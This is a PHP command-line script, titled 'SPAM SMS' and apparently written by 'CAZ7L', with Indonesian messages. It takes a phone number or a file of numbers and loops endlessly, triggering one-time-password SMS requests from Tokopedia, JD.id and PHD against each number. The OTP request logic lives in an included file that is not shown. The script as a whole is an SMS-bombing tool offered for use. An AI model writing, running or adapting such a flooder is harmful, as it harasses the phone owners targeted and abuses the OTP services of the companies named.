<?php require_once 'ekse.php';
if(strtolower(substr(PHP_OS, 0, 3)) == 'win') {
    $R  = '';
    $RR = '';
    $G  = '';
    $GG = '';
    $B  = '';
    $BB = '';
    $Y  = '';
    $YY = '';
    $X  = '';
} else {
    $R  = "\e[91m";
    $RR = "\e[91;7m";
    $G  = "\e[92m";
    $GG = "\e[92;7m";
    $B  = "\e[36m";
    $BB = "\e[36;7m";
    $Y  = "\e[93m";
    $YY = "\e[93;7m";
    $X  = "\e[0m\n";
    system('clear');
}
echo 
"\e[93m◄====================================================►
				\e[93m┌─┐┌─┐┌─┐┌┬┐  ┌─┐┌┬┐┌─┐
				\e[93m└─┐├─┘├─┤│││  └─┐│││└─┐
				\e[93m└─┘┴  ┴ ┴┴ ┴  └─┘┴ ┴└─┘
					\e[93mCoded : CAZ7L
\e[93m◄=====================================================►
\e[93m============► : ";
if(!isset($argv[1])) {
	fprintf(STDERR,$RR.'[!]MASUKKAN PERINTAH DISERTAI NOMOR HP[!]'.$X);
	exit(-1);
}
$bom=new otp();
if(is_numeric($argv[1])) {
	ob_start();
	echo $bom->otp($argv[1],'tokopedia');
	ob_get_clean();
	while(1) {
		fprintf(STDOUT,$G.'Mengirim Ke '.$Y.'['.$argv[1].']'.$X);
		ob_start();
		echo $bom->otp($argv[1],'jdid');
		echo $bom->otp($argv[1],'phd');
		ob_get_clean();
	}
}
else {
	if(file_exists($argv[1])) {
		$argv[1]=file_get_contents($argv[1]);
		$argv[1]=str_replace(' ','',$argv[1]);
		$argv[1]=explode("\n",$argv[1]);
		$count=sizeof($argv[1]);
		while(1) {
			for($x=0;$x<$count;$x++) {
				fprintf(STDOUT,$G.'Mengirim Ke '.$Y.'['.$argv[1][$x].']'.$X);
				ob_start();
				echo $bom->otp($argv[1][$x],'tokopedia');
				echo $bom->otp($argv[1][$x],'jdid');
				echo $bom->otp($argv[1][$x],'phd');
				ob_get_clean();
			}
		}
	}
	else {
		fprintf(STDERR,$RR.'File Tidak Ada'.$X);
		exit(-1);
	}
} ?>